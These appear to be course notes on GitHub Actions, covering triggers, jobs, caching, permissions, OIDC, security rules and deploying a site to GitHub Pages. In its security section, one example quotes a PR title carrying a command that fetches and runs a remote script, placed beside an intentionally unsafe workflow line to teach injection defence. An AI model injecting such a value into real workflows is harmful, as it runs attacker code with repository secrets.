# GitHub Actions — Notes

Read this first, then do [`activities.md`](activities.md). There you'll write the workflows that publish the website in [`site/`](site/) to GitHub Pages, using the ideas below.

---

## 1. The big picture

GitHub Actions runs commands for you when something happens in your repo. That might be when someone pushes code, opens a pull request, or when a timer goes off.

You describe what to do in a **workflow file**: a YAML file in `.github/workflows/`.

There are four building blocks, nested inside each other:

| Thing | What it is | Analogy |
|---|---|---|
| **Workflow** | One YAML file. Starts when its trigger happens | A recipe |
| **Job** | A group of steps that runs on one fresh machine (a "runner") | One cook at one stove |
| **Step** | One command (`run:`) or one ready-made action (`uses:`) | One instruction in the recipe |
| **Action** | A reusable step someone packaged up, e.g. `actions/checkout` | A store-bought ingredient |

A minimal workflow:

```yaml
name: ci                      # name shown in the Actions tab
on: [push, pull_request]      # WHEN to run
permissions: {}               # the token can do nothing unless a job asks (see §7)
jobs:
  test:                       # job id
    runs-on: ubuntu-24.04     # WHERE to run (a fresh Linux VM)
    permissions:
      contents: read          # this job may read the repo
    steps:
      - uses: actions/checkout@v4      # get your code onto the machine
      - run: python -m pytest          # run a command
```

Key facts:

- **Each job gets a brand-new machine.** Files don't carry over from one job to the next unless you upload them (§5).
- **Steps within a job run in order** on the same machine, so they share files.
- **Jobs run in parallel** unless you tell them to wait for each other (§3).

---

## 2. Triggers: when does a workflow run?

The `on:` key lists the events that start the workflow.

| Event | Fires when | Typical use |
|---|---|---|
| `push` | Code is pushed to a branch | Run tests on `main` |
| `pull_request` | A PR is opened or updated | Test the PR |
| `workflow_dispatch` | Someone clicks "Run workflow" | Manual deploy |
| `schedule` | A cron timer fires (UTC) | Nightly jobs |
| `workflow_run` | Another workflow finishes | "After CI, post a comment" |
| `pull_request_target` | Like `pull_request`, but with **full access** | Labeling PRs. Dangerous, see §8 |
| `merge_group` | A PR is tested in the merge queue | Required if you use a merge queue |

Filters:

```yaml
on:
  push:
    branches: [main]          # only pushes to main
  pull_request:
    paths: ["src/**"]         # only if files in src/ changed
```

**Which version of the workflow file runs?** It depends on the event, and it matters for security:

- `push`: the version in the commit you pushed.
- `pull_request`: the version **in the PR**. A PR from a fork can change your workflow file, so GitHub gives fork PRs **no secrets and a read-only token**.
- `pull_request_target`, `schedule`, `workflow_run`: the version on your **main branch**, and these runs **do** get secrets.

Notes:
- `schedule` is best-effort and can run late. Use an odd minute (`17 3 * * *`) rather than `0`, because everyone else picks `0`.
- `paths` filters only check which files changed. They don't know that changing `utils.py` can break `app.py`.

---

## 3. Jobs that depend on each other

Use `needs:` to make a job wait for another one:

```yaml
jobs:
  lint:
    runs-on: ubuntu-24.04
    steps: [ { run: echo lint } ]
  test:
    needs: lint               # waits for lint to finish successfully
    runs-on: ubuntu-24.04
    steps: [ { run: echo test } ]
```

**`if:`** decides whether a job or step runs:

```yaml
if: github.ref == 'refs/heads/main'     # only on main
```

**The "skip spreads" rule:** if a job is skipped or fails, every job that `needs` it is skipped too. This surprises people when a "notify" job at the end never runs. The fix is to tell that job to run anyway:

```yaml
notify:
  needs: [lint, test]
  if: ${{ !cancelled() }}     # run even if lint/test failed or were skipped
```

Inside a job like this, `needs.<job>.result` tells you what happened upstream: `success`, `failure`, `cancelled` or `skipped`.

**Passing values between jobs:** a job can publish outputs, which later jobs read through `needs`:

```yaml
jobs:
  detect:
    runs-on: ubuntu-24.04
    outputs:
      should_test: ${{ steps.s.outputs.should_test }}
    steps:
      - id: s
        run: echo "should_test=true" >> "$GITHUB_OUTPUT"
  test:
    needs: detect
    if: needs.detect.outputs.should_test == 'true'    # note the quotes!
    runs-on: ubuntu-24.04
    steps: [ { run: echo testing } ]
```

⚠️ **Outputs are always text.** `'true'` (with quotes) works. `true` (without quotes) never matches.

---

## 4. Matrix: run the same job many ways

A matrix runs one job several times, once for each combination of values:

```yaml
test:
  runs-on: ubuntu-24.04
  strategy:
    fail-fast: false              # keep running other versions if one fails
    matrix:
      python: ["3.11", "3.12", "3.13"]
  steps:
    - uses: actions/checkout@v4
    - uses: actions/setup-python@v5
      with: { python-version: "${{ matrix.python }}" }
    - run: python -m pytest
```

That gives 3 jobs: `test (3.11)`, `test (3.12)`, `test (3.13)`.

- Two lists multiply: 3 Pythons × 2 OSes = 6 jobs. Every extra value costs more minutes.
- `exclude:` removes a combination; `include:` adds one or adds extra keys to one.
- `fail-fast: false` is usually what you want, because you want to know *which* versions break.

**The gate job.** Branch protection ("this check must pass before merging") matches checks by **name**. Matrix job names change when you change the versions. So add one final job with a fixed name, require only that one, and let it summarize everything:

```yaml
gate:
  needs: [test]
  if: ${{ !cancelled() }}
  runs-on: ubuntu-24.04
  steps:
    - run: test "${{ needs.test.result }}" = "success"
```

---

## 5. Moving files: cache vs artifact

Remember that each job is a fresh machine. Three ways to keep files:

| | What for | Lifetime |
|---|---|---|
| **Workspace** | Sharing files between steps of one job | Gone when the job ends |
| **Artifact** (`upload-artifact` / `download-artifact`) | Passing build outputs to later jobs, or downloading them yourself | Days (you choose) |
| **Cache** (`actions/cache`) | Speeding up dependency installs | Up to 7 days if unused |

**Cache rule:** the job must still work correctly if the cache is empty or wrong. A cache only saves time.

Build the cache **key** from the things that decide the contents: usually the OS, the language version, and a hash of the lockfile:

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/uv
    key: uv-${{ runner.os }}-py${{ matrix.python }}-${{ hashFiles('uv.lock') }}
```

When the lockfile changes, the key changes, so you get fresh dependencies. Never use the branch name or commit SHA as a dependency cache key.

**Install from the lockfile, strictly.** In CI, use a flag that fails if the lockfile is out of date:

```yaml
- run: uv sync --frozen       # Python with uv
- run: uv lock --check        # fail if pyproject.toml changed without re-locking
```

(For R, the `r-lib/actions/setup-r-dependencies` action handles caching for you.)

---

## 6. Concurrency: stop wasting runs

If you push 5 times quickly to a PR, you get 5 CI runs, but only the last one matters. `concurrency` fixes that:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

- Runs with the **same group name** never run at the same time.
- `cancel-in-progress: true` cancels the older run; `false` makes the new one wait.
- Cancel old runs on PRs, but **never cancel deploys or runs on `main`**. A half-finished deploy is worse than a slow one.
- The group name is shared across the whole repo. Two different workflow files with the same group name block each other.

---

## 7. Permissions, secrets, and OIDC

### The `GITHUB_TOKEN`

Every job gets an automatic token for talking to GitHub. Give it as little power as possible:

```yaml
permissions: {}                 # top of file: nothing by default

jobs:
  test:
    permissions: { contents: read }               # read the code
  comment:
    permissions: { pull-requests: write }         # post a PR comment
```

### Secrets

Store passwords and API keys under **Settings → Secrets and variables → Actions**, and use them as `${{ secrets.NAME }}`.

- Give a secret only to the **step** that needs it (with `env:` on that step), not to the whole workflow.
- GitHub hides secret values in logs (`***`), but that's only a display filter. A step can still send the secret somewhere.
- **Environment secrets** (Settings → Environments) are only released after the environment's rules pass, such as "a reviewer must approve". Put production credentials there.
- `vars.NAME` is for non-secret settings. These are not hidden.

### OIDC: better than secrets

For cloud providers (AWS, GCP, Azure) and PyPI, you don't need to store a password at all. With `id-token: write`, the job asks GitHub for a short-lived ID card, and the cloud provider swaps it for temporary credentials:

```yaml
deploy:
  permissions: { contents: read, id-token: write }
  steps:
    - uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::123456789012:role/deploy
        aws-region: us-east-1
```

On the cloud side, you restrict *which* repo and environment may use the role (for example, only `repo:my-org/my-repo:environment:production`). Never use a wildcard like `repo:my-org/*`.

---

## 8. Security: the four rules

### Rule 1: Never put untrusted text directly into `run:`

`${{ }}` is filled in **before** the shell runs. If a PR title is `$(curl evil.sh | sh)`:

```yaml
- run: echo ${{ github.event.pull_request.title }}       # ❌ the shell runs the attacker's command
```

Pass it through an environment variable instead, so it stays plain text:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"                                      # ✅
```

Untrusted text includes PR titles and bodies, branch names, issue comments, and commit messages: anything a stranger can type.

### Rule 2: Pin actions to a commit SHA

`uses: some/action@v3` points at a tag, and the owner (or an attacker who takes over the account) can move that tag to new code. A commit SHA can't change:

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

Look up the SHA yourself (`gh api repos/actions/checkout/git/ref/tags/v4.2.2 --jq .object.sha`). Turn on Dependabot for `github-actions`, and it will open PRs to update the pins.

Every action runs **inside your job** with your token and your secrets. There's no sandbox.

### Rule 3: Keep stranger code and credentials apart

> Code from a pull request must never run in a job that has secrets or a write token.

- `pull_request` is safe for running PR code, because it has no secrets and a read-only token.
- `pull_request_target` has secrets. **Never check out and run the PR's code in it.** Only use it for things like adding labels.
- To comment on a PR with test results, do this: the `pull_request` workflow uploads a small result file as an artifact → a `workflow_run` workflow downloads it, **treats it as untrusted data** (checks its size, parses the JSON, validates the PR number), and posts the comment.

### Rule 4: Minimal permissions everywhere

`permissions: {}` at the top of the file, then only what each job needs (§7). `permissions: write-all` is almost always a mistake.

---

## 9. Reusing workflow code

Two tools, for two different purposes:

| | **Composite action** | **Reusable workflow** |
|---|---|---|
| Reuses | A few **steps** | Whole **jobs** |
| Lives in | `some-folder/action.yml` | `.github/workflows/x.yml` with `on: workflow_call` |
| Called with | `- uses: ./some-folder` (as a step) | `jobs: x: uses: ./.github/workflows/x.yml` (as a job) |
| Can choose its own runner, matrix, permissions | No | Yes |

**Composite action** (shared setup steps):

```yaml
# .github/actions/setup/action.yml
name: Setup
inputs:
  python-version: { required: true }
runs:
  using: composite
  steps:
    - uses: astral-sh/setup-uv@v5
    - shell: bash                       # composite steps must say which shell
      run: uv python install "${{ inputs.python-version }}" && uv sync --frozen
```

**Reusable workflow** (a whole CI pipeline):

```yaml
# .github/workflows/python-ci.yml
on:
  workflow_call:
    inputs:
      python-versions: { type: string, default: '["3.12","3.13"]' }
jobs:
  test: ...
```

Calling it:

```yaml
jobs:
  ci:
    uses: ./.github/workflows/python-ci.yml        # or other-org/repo/.github/workflows/x.yml@<sha>
    with:
      python-versions: '["3.12"]'
    permissions: { contents: read }
```

Notes:
- Local `uses: ./...` paths only work **after** `actions/checkout`.
- Pass secrets one by one (`secrets: { TOKEN: ... }`), not with `secrets: inherit`, especially to workflows you don't own.

---

## 10. Releasing and deploying

### Build once, deploy that same thing

Build your package or image **once**, save it as an artifact, and deploy *that exact file* to staging and then to production. Rebuilding for each environment can give you slightly different files.

```yaml
jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - run: uv build
      - run: cd dist && sha256sum * > SHA256SUMS      # fingerprint every file
      - uses: actions/upload-artifact@v4
        with: { name: dist, path: dist/ }

  deploy-staging:
    needs: build
    environment: staging
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/download-artifact@v4
        with: { name: dist, path: dist/ }
      - run: cd dist && sha256sum -c SHA256SUMS      # prove it's the same file
      - run: echo "deploy to staging"

  deploy-production:
    needs: deploy-staging
    environment: production                # set "required reviewers" in Settings
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/download-artifact@v4
        with: { name: dist, path: dist/ }
      - run: cd dist && sha256sum -c SHA256SUMS
      - run: echo "deploy to production"
```

### Environments are approval gates

Under **Settings → Environments**, you can require a reviewer to approve, add a wait timer, and restrict which branches or tags may deploy. Restricting production to `main` and `v*` tags matters most, because otherwise anyone who can push a branch could deploy it.

### Publish without passwords

- **PyPI:** use *Trusted Publishing*. The job needs only `id-token: write`, plus `pypa/gh-action-pypi-publish`. No token is stored anywhere.
- **Container images (GHCR):** `GITHUB_TOKEN` with `packages: write`. Deploy by **digest** (`image@sha256:...`), not by tag, because tags can move.

### Prove where a file came from

```yaml
permissions: { id-token: write, attestations: write, contents: read }
steps:
  - uses: actions/attest-build-provenance@v1
    with: { subject-path: "dist/*" }
```

Then **check it** before deploying:

```bash
gh attestation verify dist/app.whl --repo me/app \
  --signer-workflow me/app/.github/workflows/release.yml
```

Creating the proof is easy. **Checking it is what actually protects you.**

---

## 11. Deploying a website with GitHub Pages

GitHub Pages hosts static websites (HTML, CSS, JS) for free on public repos, at `https://<user>.github.io/<repo>/`. With **Settings → Pages → Source: GitHub Actions**, *your workflow* decides what gets published.

Publishing takes two official actions:

| Action | Job | What it does |
|---|---|---|
| `actions/upload-pages-artifact` | build | Packs a folder (e.g. `site/`) into a special artifact |
| `actions/deploy-pages` | deploy | Publishes that artifact as the live site |

How the pieces fit together:

- **The upload** needs to know *which folder* to publish. That's its `path` input.
- **The deploy** needs two permissions:

  | Permission | Why |
  |---|---|
  | `pages: write` | Allowed to publish to Pages |
  | `id-token: write` | Proves to Pages *which workflow* is publishing (OIDC, §7) |

  It also outputs the live address as `page_url`, which you can show on the run page through the job's `environment: url:`.
- **The deploy job** must use the environment named **`github-pages`**.
- **The upload and the deploy can be separate jobs.** The deploy job doesn't need a checkout, because it publishes the artifact the earlier job uploaded.

Things to know:

- The `github-pages` **environment** is created for you. Set it so only `main` may deploy (Settings → Environments).
- Use a concurrency group that *waits* rather than cancels, so two deploys never overlap and none is cut off halfway (§6).
- Put the "check the site" job *before* `build` with `needs:`, so a broken site never goes live.
- Anything you write into the site from the workflow (like a commit message) is **untrusted text**. Pass it to scripts with `env:`, and in the page's JavaScript show it with `textContent`, never `innerHTML`.

---

## 12. Debugging

1. Read the log, and look at the failing step's exact command.
2. Re-run with debug logging: add a repo variable `ACTIONS_STEP_DEBUG` = `true`, then remove it afterwards.
3. Print what Actions sees: `run: echo '${{ toJSON(github) }}'` (only on a test branch).
4. Common causes:

| Symptom | Usually |
|---|---|
| Workflow didn't start | `on:` filter didn't match, or the file isn't on the right branch |
| Job is grey (skipped) | An `if:` was false, or a job it `needs` was skipped |
| `if:` never true | Compared to `true` instead of `'true'` |
| Secret is empty | The PR comes from a fork, or the secret is scoped to an environment the job doesn't use |
| Required check "waiting" forever | You required a matrix job name; require the gate instead |
| Run cancelled by itself | A newer run with the same concurrency group |

---

## 13. When you go bigger (good to know)

- **Self-hosted runners:** your own machines. Use them when you need a private network or special hardware. Use **ephemeral** runners (one job, then destroyed), and never attach them to public repos.
- **Monorepos:** test the changed package *and* everything that depends on it, not just the changed folder.
- **Merge queue:** tests PRs combined with each other before merging. Add `merge_group:` to `on:`, or the queue waits forever.
- **Organizations:** restrict which actions are allowed, use rulesets to require checks, and prefer a GitHub App token over a personal access token for automation.

---

## Cheat sheet

```yaml
name: ci
on:
  pull_request:
  push: { branches: [main] }
permissions: {}
concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
jobs:
  test:
    runs-on: ubuntu-24.04
    permissions: { contents: read }
    strategy:
      fail-fast: false
      matrix: { python: ["3.12", "3.13"] }
    steps:
      - uses: actions/checkout@<sha> # v4
      - uses: astral-sh/setup-uv@<sha> # v5
      - run: uv python install ${{ matrix.python }}
      - run: uv sync --frozen
      - run: uv run pytest
  gate:
    needs: [test]
    if: ${{ !cancelled() }}
    runs-on: ubuntu-24.04
    steps:
      - run: test "${{ needs.test.result }}" = "success"
```

Before merging any workflow, check:

- `permissions: {}` at the top
- Actions pinned to SHAs
- No `${{ github.event... }}` inside `run:`
- Secrets only on the steps that need them
- PR code never runs alongside secrets
- One stable `gate` check
